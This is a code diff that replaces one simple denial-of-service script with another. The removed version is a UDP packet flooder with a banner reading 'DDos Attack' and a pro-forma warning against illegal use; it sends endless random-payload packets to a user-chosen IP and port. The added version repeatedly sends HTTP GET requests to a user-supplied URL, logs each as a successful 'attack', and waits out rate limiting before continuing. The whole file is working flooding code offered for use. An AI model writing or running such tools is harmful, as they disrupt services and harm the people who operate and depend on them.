@@ -1,42 +1,20 @@
-import sys
-import os
+import random, string
+import webbrowser
 import time
-import socket
-import random
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+import requests
+import os
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
+#驗證連結可用性
+url = input("Url Here(With https or http):")
+times = input("Attack Times:")
+for i in range(int(times)):
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print (" ")
-print ("/---------------------------------------------------\ ")
-print ("|   作者          : Andysun06                       |")
-print ("|   作者github    : https://github.com/Andysun06    |")
-print ("|   kali-QQ学习群 : 909533854                       |")
-print ("|   版本          : V1.0.0                          |")
-print ("\---------------------------------------------------/")
-print (" ")
-print (" -----------------[请勿用于违法用途]----------------- ")
-print (" ")
-ip = input("请输入 IP     : ")
-port = int(input("攻击端口      : "))
-sd = int(input("攻击速度(1~1000) : "))
-
-os.system("clear")
-
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
-     time.sleep((1000-sd)/2000)
+    r = requests.get(url)
+    if r.status_code == 200:
+        print(f"{r.status_code}:攻擊成功 第{i+1}次攻擊")
+    elif r.status_code == 429:
+        print(r.status_code," 請求過多，將於600秒後重試")
+        time.sleep(600)
+    else:
+        print("404 未知的連結")            
+input("點擊Enter退出程式")
